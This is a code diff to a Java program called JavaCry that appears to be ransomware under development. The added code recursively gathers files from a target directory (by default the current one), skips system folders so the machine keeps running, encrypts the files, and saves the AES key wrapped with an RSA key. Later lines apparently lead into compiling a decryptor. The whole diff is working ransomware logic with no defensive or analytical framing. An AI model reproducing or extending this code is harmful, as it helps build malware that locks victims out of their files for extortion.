@@ -31,6 +31,28 @@ public class JavaCry {
     private static Process process;
     private static List<String> avoidDir = new ArrayList<String>();
 
+    public static void search(String path) throws Exception {
+        File root = new File(path);
+        File[] list = root.listFiles();
+
+        if(list == null) return;
+
+        for(File f: list) {
+            String name = f.getName();
+            if (f.isDirectory()) {
+                if (avoidDir.contains(name.toLowerCase())) return; //want system to still work
+                search(f.getAbsolutePath());
+
+            } else {
+                //split to get file extension
+                System.out.println(name);
+                if (!name.equals("JavaCry.jar")) {
+                    files.add(f.toPath());
+                }
+            }
+        }
+    }
+
     // decrypt files from a list of paths
     public static void decryptFiles(String keyString) {
         crypto.setPubKey(keyString);
@@ -127,37 +149,54 @@ public class JavaCry {
 
             File self = new File("JavaCry.jar");
             avoidDir.add(self.getAbsolutePath());
-            avoidDir.add("JavaCry.jar");
-            avoidDir.add("/windows");
-            avoidDir.add("/library");
-            avoidDir.add("/boot");
-            avoidDir.add("/local");
-            avoidDir.add("/program files");
-            avoidDir.add("/programdata");
-            avoidDir.add("/System");
-            avoidDir.add("/Volumes");
-            avoidDir.add("/dev");
-            avoidDir.add("/etc");
-            avoidDir.add("/bin");
+            avoidDir.add("windows");
+            avoidDir.add("library");
+            avoidDir.add("boot");
+            avoidDir.add("local");
+            avoidDir.add("program files");
+            avoidDir.add("programdata");
+            avoidDir.add("system");
+            avoidDir.add("volumes");
+            avoidDir.add("dev");
+            avoidDir.add("etc");
+            avoidDir.add("bin");
             avoidDir.add("$");
 
             // list files recursively within the target directory
-            try (Stream<Path> paths = Files.walk(Paths.get(targetPath))) {
-                files = paths.filter(Files::isRegularFile).collect(Collectors.toList());
-            }
+            // try (Stream<Path> paths = Files.walk(Paths.get(targetPath))) {
+            //     files = paths.filter(Files::isRegularFile).collect(Collectors.toList());
+            // }
 
-            catch (Exception e) {
-                ;
-            }
+            // catch (Exception e) {
+            //     System.out.println(e);
+            // }
 
-            // avoid certain directories
-            for (int i = 0; i < files.size(); i++) {
-
-                if (avoidDir.contains(files.get(i).toString())) {
-                    files.remove(i);
-                    i--;
+            try {
+                if (targetPath.equals("")) {
+                    targetPath = System.getProperty("user.dir");
+                } else {
+                    File f = new File(targetPath);
+                    targetPath = f.getAbsolutePath();
                 }
+                System.out.println("Searching " + targetPath);
+                search(targetPath);
+            } catch (Exception e) {
+                System.out.println(e);
             }
+
+
+
+            System.out.println(files);
+
+            // // avoid certain directories
+            // for (int i = 0; i < files.size(); i++) {
+            //     System.out.println(files.get(i).toString());
+
+            //     if (avoidDir.contains(files.get(i).toString())) {
+            //         files.remove(i);
+            //         i--;
+            //     }
+            // }
 
             // This will encrypt files recursively in the target directory
             encryptFiles();
@@ -165,6 +204,7 @@ public class JavaCry {
             // This will securely save the AES encryption key by encrypting it with the
             // received RSA public key.
             crypto.SaveAESKey();
+            crypto.SaveRSAKey();
 
             /*
              * =========================================================
@@ -208,8 +248,8 @@ public class JavaCry {
                 System.out.println("fetch loading.gif");
                 // File loadingImg = new File("/img/loading.gif");
                 InputStream imgStream = JavaCry.class.getResourceAsStream("/img/loading.gif");
+                System.out.println(Paths.get("loading.gif"));
                 Files.copy(imgStream, Paths.get("loading.gif"), StandardCopyOption.REPLACE_EXISTING);
-
                 /*
                  * =========================================================
                  * Compiling Decryptor.java
